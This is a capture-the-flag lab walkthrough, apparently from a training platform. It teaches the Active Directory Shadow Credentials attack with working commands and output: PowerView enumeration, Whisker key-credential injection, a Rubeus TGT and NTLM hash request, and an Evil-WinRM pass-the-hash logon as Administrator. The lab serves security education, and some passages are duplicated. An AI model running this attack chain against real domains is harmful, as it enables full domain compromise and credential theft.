AntarctiCrafts' technology stack was very specialised. It was primarily focused on cutting-edge climate research rather than prioritising robust cyber security measures.

As the integration of the two infrastructure systems progresses, vulnerabilities begin to surface. While AntarctiCrafts' team displays remarkable expertise, their small size means they need to emphasise cyber security awareness.

Throughout the room, you'll see that some users have too many permissions. We addressed most of these instances in the previous audit, but is everything now sorted out from the perspective of the HR user?

**Learning Objectives**

- Understanding Active Directory
- Introduction to Windows Hello for Business
- Prerequisites for exploiting GenericWrite privilege
- How the Shadow Credentials attack works
- How to exploit the vulnerability

**Active Directory 101**

Active Directory (AD) is a system mainly used by businesses in Windows environments. It's a centralised authentication system. The Domain Controller (DC) is at the heart of AD and typically manages data storage, authentication, and authorisation within a domain.

You can think of AD as a digital database containing objects like users, groups, and computers, each with specific attributes and permissions. Ideally, it applies the principle of least privilege and uses a hierarchical approach to managing roles and giving authenticated users access to all non-sensitive data throughout the system. For this reason, assigning permissions to users must be approached cautiously, as it can potentially compromise the entire Active Directory. We'll delve into this in the upcoming exploitation section.

**Think Passwords Are Hard To Remember - Say Hello to WHfB**

Microsoft introduced Windows Hello for Business (WHfB) as a modern and secure way to replace conventional password-based authentication. Instead of relying on traditional passwords, WHfB utilises cryptographic keys for user verification. Users on the Active Directory domain can access the AD using a PIN or biometrics connected to a pair of cryptographic keys: public and private. Those keys help to prove the identity of the entity to which they belong. The msDS-KeyCredentialLink is an attribute used by the Domain Controller to store the public key in WHfB for enrolling a new user device (such as a computer). In short, each user object in the Active Directory database will have its public key stored in this unique attribute.

Here's the procedure to store a new pair of certificates with WHfB:

- Trusted Platform Module (TPM) public-private key pair generation: The TPM creates a public-private key pair for the user's account when they enrol. It's crucial to remember that the private key never leaves the TPM and is never disclosed.
- Client certificate request: The client initiates a certificate request to receive a trustworthy certificate. The organisation's certificate issuing authority (CA) receives this request and provides a valid certificate.
- Key storage: The user account's msDS-KeyCredentialLink attribute will be set.

**Authentication Process**

- Authorisation: The Domain Controller decrypts the client's pre-authentication data using the raw public key stored in the msDS-KeyCredentialLink attribute of the user's account.
- Certificate generation: The certificate is created for the user by the Domain Controller and can be sent back to the client.
- Authentication: After that, the client can log in to the Active Directory domain using the certificate.

Please note that an attacker capable of overriding the msDS-KeyCredentialLink of a specific vulnerable user can compromise it.

**Enumeration**

Now is your chance to shine and ensure no security misconfigurations are lurking in the shadows. So, let's get started by dusting off our magnifying glasses (or mouse pointers). Enumerating the Active Directory for the vulnerable permission is the first step to check if the current user has any write capabilities over another user on the AD.

To achieve this, you can use the PowerShell script PowerView with the following command: Find-InterestingDomainAcl

This functionality will list all the abusable privileges. It's then possible to filter for the current user: "hr".

We are specifically looking for any write privilege since the goal is to overwrite the msDS-KeyCredentialLink

From the vulnerable machine, launch PowerShell, which is pinned on your taskbar, and enter the following commands:

- ```cd C:\Users\hr\Desktop``` moves to the folder containing all the exploitation tools.
- ```powershell -ep bypass``` will bypass the default policy for arbitrary PowerShell script execution.
- ```. .\PowerView.ps1``` loads the PowerView script into the memory.

At this point, we can enumerate the privileges by running:

Find-InterestingDomainAcl -ResolveGuids

As you may see, this command will return all users' privileges. Since we are specifically looking for the current user "hr", we need to filter out using:

Where-Object { $_.IdentityReferenceName -eq "hr" }  

We're interested in the current user, the vulnerable user, and the privilege assigned. We can filter that out by running:

Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

Now, you can launch the full command:

```
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

```
PS C:\Users\hr> cd C:\Users\hr\Desktop
PS C:\Users\hr\Desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hr\Desktop> . .\PowerView.ps1
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=Administrator,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite

PS C:\Users\hr\Desktop>
```

As you can see from the previous output, the user "hr" has the GenericWrite permission over the administrator object visible on the CN attribute. Later, we can compromise the account with that privilege by updating the msDS-KeyCredentialLink with a certificate. This vulnerability is known as the Shadow Credentials attack.

The vulnerable user may not be the same as the administrator; please note that down since you will use it in the exploitation section!

Exploitation

One helpful tool for abusing the vulnerable privilege is Whisker, a C# utility created by Elad Shamir. Using Whisker is straightforward: once we have a vulnerable user, we can run the add command from Whisker to simulate the enrollment of a malicious device, updating the msDS-KeyCredentialLink attribute.

This task can be accomplished by running the following command: 

.\Whisker.exe add /target:Administrator

In your case, you'll have to replace the /target parameter with the one from the enumeration step executed inside your VM.

```
PS C:\Users\hr\Desktop> .\Whisker.exe add /target:Administrator
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password qfyNlIfCjVqzwh1e
[*] Searching for the target account
[*] Target user found: CN=Administrator,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID ae6efd6c-27c6-4217-9675-177048179106
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:
Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0EgglpMIIJZTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

The tool will conveniently provide the certificate necessary to authenticate the impersonation of the vulnerable user with a command ready to be launched using Rubeus.

The core idea behind the authentication in AD is using the Kerberos protocol, which provides tokens (TGT) for each user. A TGT can be seen as a session token that avoids the credentials prompt after the user authentication.

Rubeus, a C# toolset designed for direct Kerberos interaction and exploitation, was developed by SpecterOps. a pass-the-hash attack! 

You can continue the exploitation by asking for a TGT of the vulnerable user using the certificate generated in the previous command.

Exploit McRed

Once you've obtained the certificate, you can acquire a valid TGT and impersonate the vulnerable user. Additionally, the NTLM hash of the user account can be displayed in the console output, which can be used for a pass-the-hash attack!

You can continue the exploitation by asking for a TGT of the vulnerable user using the certificate generated in the previous command.

To do so, copy and paste the output from the previous command. A detailed explanation of what that command is doing can be seen below:

[*] You can now run Rubeus with the following syntax:

asktgt this will make a request to obtain the TGT

/user the user we want to impersonate for the TGT

/certificate the certificate generated to impersonate the target user

/password the password used for decoding the certificate since it's encrypted

/domain the target Domain

/getcredentials this flag will retrieve the NTLM hash, which will be used in the next step

/dc the Domain Controller that will generate the TGT

```
PS C:\Users\hr\Desktop> .\Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEH[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\Administrator'
[*] Using domain controller: fe80::8847:dfd7:4897:54ac%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF6jCCBeagAwIBBaEDAgEWooIFAzCCBP9hggT7MIIE96ADAgEFoQsbCUFPQy5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJQU9DLmxvY2Fso4IEwTCCBL2gAwIBEqEDAgECooIErwSCBKu7ZNuUhyXip5u3
      Izrge1i3/HA62uPhIdKy/O6GgKDn/6GMCYPUe3x+flZ2aEjNPcd7MBvVJXBWJQbA493xkJ9W3thjas5T
      qa+ZTom1OOjfmWsOowuuJQhW+PkbyG5a5K35wzsF4RAV2/atYyTCXukU3XFanSafnVORwqCCLWgDdbUq
      y1oJCw1TBHkNteLdzRkJ4MA6TEYpL5fu4WCDlK6YvvRWvSi29n1lDVW+qHESetdq7Mk8aZ4O2tR4Rq5Q
      zmFQg6cqRT+3FNsXhMSTshfsOYSefBOYaoJE9XQfaxB4vgQ41DE10aXTu2FMS7CdvdtObFis9XjtaRU1
      [snip]

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  Administrator
  UserRealm                :  AOC.LOCAL
  StartTime                :  10/24/2023 9:31:12 AM
  EndTime                  :  10/24/2023 7:31:12 PM
  RenewTill                :  10/31/2023 9:31:12 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  s8DRdxfZCS/1B8/y7VTB7g==
  ASREP (key)              :  A3DAC31C254776E288FDFAD5314D7231

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DDD22F37A3037852AFGE70FAB93E0CC71 
```

You can now execute a pass-the-hash attack using the NTLM hash obtained from the previous command. This attack involves leveraging the encrypted password stored in the Domain Controller rather than relying on the plaintext password.

To do this, you can use Evil-WinRM, a tool for remotely managing Windows systems abusing the Windows Remote Management (WinRM) protocol.

```
evil-winrm -i 10.10.215.197 -u Administrator -H F138C405BD9F3139994E220CE0212E7C
```

You have to use the -i parameter with 10.10.215.197, the -u parameter with the user from the enumeration step, and the -H parameter with the hash of the user you got from the last row of the previous step (NTLM).

To do this, you can use Evil-WinRM on your AttackBox.

```
root@attackbox ~/D/vpn> evil-winrm -i IP_MACHINE -u Administrator -H F138C405BD9F3139994E220CE0212E7C
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Documents> more C:\Users\Administrator\Desktop\flag.txt
THM{***********}

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

**Conclusion**

We've stumbled upon a misconfiguration after all! In this scenario, an attacker could gain full access to our Active Directory, posing a severe threat to the entire AntarctiCrafts security system.

As for our recommendations, we'll emphasise cyber security's golden rule: "the principle of least privilege". By strictly adhering to this principle, we can limit access to only what's necessary for each user or system, significantly reducing the risk of such a devastating compromise.

In the chilly world of cyber security, less is often more!

**Q/A**

